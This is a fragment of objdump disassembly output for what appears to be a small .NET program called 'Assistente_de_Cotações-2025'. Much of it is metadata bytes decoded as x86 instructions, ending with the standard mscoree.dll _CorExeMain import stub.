  40972a:	06                   	push   %es
  40972b:	12 81 c9 07 20 02    	adc    0x22007c9(%ecx),%al
  409731:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409734:	81 cd 06 20 01 01    	or     $0x1012006,%ebp
  40973a:	12 81 d1 08 15 12    	adc    0x121508d1(%ecx),%al
  409740:	81 d5 01 12 81 d9    	adc    $0xd9811201,%ebp
  409746:	05 20 00 12 81       	add    $0x81120020,%eax
  40974b:	ad                   	lods   %ds:(%esi),%eax
  40974c:	07                   	pop    %es
  40974d:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  409752:	12 7d 06             	adc    0x6(%ebp),%bh
  409755:	20 01                	and    %al,(%ecx)
  409757:	01 12                	add    %edx,(%edx)
  409759:	81 e1 07 00 01 12    	and    $0x12010007,%ecx
  40975f:	81 e9 12 1d 06 20    	sub    $0x20061d12,%ecx
  409765:	01 01                	add    %eax,(%ecx)
  409767:	11 81 ed 05 00 00    	adc    %eax,0x5ed(%ecx)
  40976d:	12 81 f1 06 20 01    	adc    0x12006f1(%ecx),%al
  409773:	01 12                	add    %edx,(%edx)
  409775:	81 e9 05 20 00 12    	sub    $0x12002005,%ecx
  40977b:	81 f5 0a 20 00 15    	xor    $0x1500200a,%ebp
  409781:	12 81 d5 01 12 81    	adc    -0x7eedfe2b(%ecx),%al
  409787:	d9 08                	(bad) (%eax)
  409789:	15 12 81 f9 01       	adc    $0x1f98112,%eax
  40978e:	12 81 cd 0b 20 01    	adc    0x1200bcd(%ecx),%al
  409794:	01 15 12 81 f9 01    	add    %edx,0x1f98112
  40979a:	12 81 cd 06 15 12    	adc    0x121506cd(%ecx),%al
  4097a0:	81 d5 01 0e 03 00    	adc    $0x30e01,%ebp
  4097a6:	00 0e                	add    %cl,(%esi)
  4097a8:	06                   	push   %es
  4097a9:	00 03                	add    %al,(%ebx)
  4097ab:	08 0e                	or     %cl,(%esi)
  4097ad:	0e                   	push   %cs
  4097ae:	02 07                	add    (%edi),%al
  4097b0:	20 02                	and    %al,(%edx)
  4097b2:	02 0e                	add    (%esi),%cl
  4097b4:	11 81 fd 0a 20 03    	adc    %eax,0x3200afd(%ecx)
  4097ba:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  4097bf:	11 82 01 0c 00 04    	adc    %eax,0x4000c01(%edx)
  4097c5:	11 49 0e             	adc    %ecx,0xe(%ecx)
  4097c8:	0e                   	push   %cs
  4097c9:	11 82 05 11 82 09    	adc    %eax,0x9821105(%edx)
  4097cf:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  4097d4:	03 06                	add    (%esi),%eax
  4097d6:	20 01                	and    %al,(%ecx)
  4097d8:	12 82 11 0e 05 00    	adc    0x50e11(%edx),%al
  4097de:	00 12                	add    %dl,(%edx)
  4097e0:	82 15 09 20 02 01 12 	adcb   $0x12,0x1022009
  4097e7:	82 11 12             	adcb   $0x12,(%ecx)
  4097ea:	82 15 05 00 02 01 0e 	adcb   $0xe,0x1020005
  4097f1:	0e                   	push   %cs
  4097f2:	06                   	push   %es
  4097f3:	20 01                	and    %al,(%ecx)
  4097f5:	12 81 f1 0e 06 20    	adc    0x20060ef1(%ecx),%al
  4097fb:	01 12                	add    %edx,(%edx)
  4097fd:	82 29 0e             	subb   $0xe,(%ecx)
  409800:	05 20 00 12 82       	add    $0x82120020,%eax
  409805:	31 06                	xor    %eax,(%esi)
  409807:	00 02                	add    %al,(%edx)
  409809:	02 0e                	add    (%esi),%cl
  40980b:	10 0d 06 20 01 12    	adc    %cl,0x12012006
  409811:	82 2d 08 07 20 02 12 	subb   $0x12,0x2200708
  409818:	81 f1 0e 1c 06 20    	xor    $0x20061c0e,%ecx
  40981e:	01 12                	add    %edx,(%edx)
  409820:	81 f1 1c 1b 30 02    	xor    $0x2301b1c,%ecx
  409826:	05 12 81 d1 15       	add    $0x15d18112,%eax
  40982b:	12 81 d5 01 1e 00    	adc    0x1e01d5(%ecx),%al
  409831:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  409836:	1e                   	push   %ds
  409837:	01 12                	add    %edx,(%edx)
  409839:	82 45 12 82          	addb   $0x82,0x12(%ebp)
  40983d:	41                   	inc    %ecx
  40983e:	1c 05                	sbb    $0x5,%al
  409840:	0a 02                	or     (%edx),%al
  409842:	0e                   	push   %cs
  409843:	12 7d 04             	adc    0x4(%ebp),%bh
  409846:	20 01                	and    %al,(%ecx)
  409848:	02 08                	add    (%eax),%cl
  40984a:	05 20 00 12 82       	add    $0x82120020,%eax
  40984f:	4d                   	dec    %ebp
  409850:	05 20 00 11 82       	add    $0x82110020,%eax
  409855:	51                   	push   %ecx
  409856:	51                   	push   %ecx
  409857:	07                   	pop    %es
  409858:	1f                   	pop    %ds
  409859:	12 54 02 0e          	adc    0xe(%edx,%eax,1),%dl
  40985d:	12 48 12             	adc    0x12(%eax),%cl
  409860:	81 e9 12 81 f1 15    	sub    $0x15f18112,%ecx
  409866:	12 81 d5 01 0e 0e    	adc    0xe0e01d5(%ecx),%al
  40986c:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  409871:	12 7d 08             	adc    0x8(%ebp),%bh
  409874:	08 0e                	or     %cl,(%esi)
  409876:	1d 0e 12 81 2d       	sbb    $0x2d81120e,%eax
  40987b:	12 82 11 12 82 19    	adc    0x19821211(%edx),%al
  409881:	0e                   	push   %cs
  409882:	0e                   	push   %cs
  409883:	12 82 25 08 12 82    	adc    -0x7dedf7db(%edx),%al
  409889:	29 0d 15 12 81 f9    	sub    %ecx,0xf9811215
  40988f:	01 12                	add    %edx,(%edx)
  409891:	81 cd 15 12 81 f9    	or     $0xf9811215,%ebp
  409897:	01 12                	add    %edx,(%edx)
  409899:	81 cd 12 82 41 12    	or     $0x12418212,%ebp
  40989f:	58                   	pop    %eax
  4098a0:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  4098a6:	1d 03 22 01 00       	sbb    $0x12203,%eax
  4098ab:	1d 41 73 73 69       	sbb    $0x69737341,%eax
  4098b0:	73 74                	jae    0x409926
  4098b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098b4:	74 65                	je     0x40991b
  4098b6:	5f                   	pop    %edi
  4098b7:	64 65 5f             	fs gs pop %edi
  4098ba:	43                   	inc    %ebx
  4098bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4098bc:	74 61                	je     0x40991f
  4098be:	c3                   	ret
  4098bf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4098c0:	c3                   	ret
  4098c1:	b5 65                	mov    $0x65,%ch
  4098c3:	73 2d                	jae    0x4098f2
  4098c5:	32 30                	xor    (%eax),%dh
  4098c7:	32 35 00 00 05 01    	xor    0x1050000,%dh
  4098cd:	00 00                	add    %al,(%eax)
  4098cf:	00 00                	add    %al,(%eax)
  4098d1:	0b 01                	or     (%ecx),%eax
  4098d3:	00 06                	add    %al,(%esi)
  4098d5:	32 2e                	xor    (%esi),%ch
  4098d7:	30 2e                	xor    %ch,(%esi)
  4098d9:	39 31                	cmp    %esi,(%ecx)
  4098db:	00 00                	add    %al,(%eax)
  4098dd:	08 01                	or     %al,(%ecx)
  4098df:	00 08                	add    %cl,(%eax)
  4098e1:	00 00                	add    %al,(%eax)
  4098e3:	00 00                	add    %al,(%eax)
  4098e5:	00 1e                	add    %bl,(%esi)
  4098e7:	01 00                	add    %eax,(%eax)
  4098e9:	01 00                	add    %eax,(%eax)
  4098eb:	54                   	push   %esp
  4098ec:	02 16                	add    (%esi),%dl
  4098ee:	57                   	push   %edi
  4098ef:	72 61                	jb     0x409952
  4098f1:	70 4e                	jo     0x409941
  4098f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f5:	45                   	inc    %ebp
  4098f6:	78 63                	js     0x40995b
  4098f8:	65 70 74             	gs jo  0x40996f
  4098fb:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  409902:	77 73                	ja     0x409977
  409904:	01 00                	add    %eax,(%eax)
  409906:	00 00                	add    %al,(%eax)
  409908:	30 99 00 00 00 00    	xor    %bl,0x0(%ecx)
  40990e:	00 00                	add    %al,(%eax)
  409910:	00 00                	add    %al,(%eax)
  409912:	00 00                	add    %al,(%eax)
  409914:	4e                   	dec    %esi
  409915:	99                   	cltd
  409916:	00 00                	add    %al,(%eax)
  409918:	00 20                	add    %ah,(%eax)
	...
  40992e:	00 00                	add    %al,(%eax)
  409930:	40                   	inc    %eax
  409931:	99                   	cltd
	...
  409942:	5f                   	pop    %edi
  409943:	43                   	inc    %ebx
  409944:	6f                   	outsl  %ds:(%esi),(%dx)
  409945:	72 45                	jb     0x40998c
  409947:	78 65                	js     0x4099ae
  409949:	4d                   	dec    %ebp
  40994a:	61                   	popa
  40994b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  409952:	72 65                	jb     0x4099b9
  409954:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  409958:	6c                   	insb   (%dx),%es:(%edi)
  409959:	00 00                	add    %al,(%eax)
  40995b:	00 00                	add    %al,(%eax)
  40995d:	00 ff                	add    %bh,%bh
  40995f:	25 00 20 40 00       	and    $0x402000,%eax
